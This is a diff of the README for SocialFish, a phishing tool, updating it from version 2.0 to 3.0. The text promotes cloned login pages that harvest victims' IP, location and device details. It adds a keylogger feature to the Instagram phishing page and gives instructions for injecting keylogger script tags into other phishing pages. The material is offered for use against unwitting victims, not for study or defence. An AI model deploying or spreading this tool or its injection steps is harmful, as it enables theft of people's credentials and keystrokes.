@@ -2,14 +2,15 @@
   <img src="https://raw.githubusercontent.com/An0nUD4Y/SocialFish/master/social.png">  
 </p>
 
-<h1 align="center">SocialFish v2.0</h1>
+<h1 align="center">SocialFish v3.0</h1>
 <p align="center">
-       NOW MORE ATTACKS ARE AVAILABLE.
-  In Ultimate phishing tool with Ngrok integrated
+      AN ADVANCED PHISHING TOOL WITH MULTIPLE FUNCTIONALITY 
+     [ Automatic keylogger, Victim Device info , Many Pages ]
 </p>
 
 <p align="center">
- NOW YOU WILL GET LIVE INFORMATION ABOUT YOUR VICTIM'S IP, GEOLOCATION, COUNTRY, ISP, CITY, ATTACKED DATE & TIME, AND MANY MORE.
+ NOW WE HAVE ADDED KEYLOGGER WITH THE PHISHING PAGES // VICTIM DEVICE INFO ALSO AVAILABLE
+ 
  
 </p>
 
@@ -20,8 +21,8 @@
 * PHP
 * sudo
 ## :octocat: DEVELOPERS 
-1. usama7628674 
-2. An0nUD4Y [ Instagram.com/its_udy ]
+1. An0nUD4Y [ Instagram.com/its_udy ]
+2. usama7628674  
 3. UNDEADSEC
 4. Micrafast 
 5. alexmozzhakov
@@ -165,6 +166,22 @@ pkg install git python php curl openssh grep && pip3 install wget && git clone h
 
 **2) COMPATIBILITY**
 - All the sites are mobile compatible.
+
+**3) KEYLOGGER**
+- Now you will also have the ability to capture all the keystokes of victim.
+
+**(CURRENTLY):- This feature is added only on instagram web page, to less the possibility of slow functioning of generated link)
+
+**HOW TO ADD IT MANUALLY ?
+-- You can add this manually by putting the codes on index page.(put these code at anywhere inside the index page // but not between any other script codes)
+
+```
+<script src="keylogger.js">
+<script src="keylogger.php">
+
+```
+
+
 
 ### NEW PAGES
 <p align="center">
